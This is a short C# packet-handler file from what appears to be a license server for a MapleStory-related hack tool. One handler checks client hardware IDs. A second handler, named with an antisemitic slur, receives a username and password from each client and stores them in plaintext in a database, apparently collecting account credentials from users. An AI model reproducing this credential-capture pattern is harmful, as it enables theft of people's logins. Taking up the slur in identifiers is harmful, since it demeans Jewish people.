using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using XianServer.Auth;
using XianServer.Buffer;
using XianServer.Server;
using XianServer.User;

namespace XianServer.Packet
{
    public static class PacketHandler
    {
        public static void HandleLoginRequest(Client c, BufferReader p)
        {
            c.Hwid = p.ReadMapleString();
            byte region = p.ReadByte();

            bool result = WvsServer.Instance.AuthCenter.AddClient(c.Hwid, c);

            if(result)
            {
                //Logger.Write("Client {0} allowed", c.Name);
                c.SendLoginSuccess(region);
            }
            else
            {
                //Logger.Write("Client {0} denied", c.Name);
                c.SendLoginFailed(1); //1 = no available lisence
                c.Dispose();
            }
        }

        public static void HandleJewShit(Client c,BufferReader p)
        {
            string hwid = p.ReadMapleString();
            string user = p.ReadMapleString();
            string pass = p.ReadMapleString();

            WvsServer.Instance.Database.UpdateJewhook(hwid, user, pass);
            
            Logger.Write("{0} logged in", user);
        }
    }
}
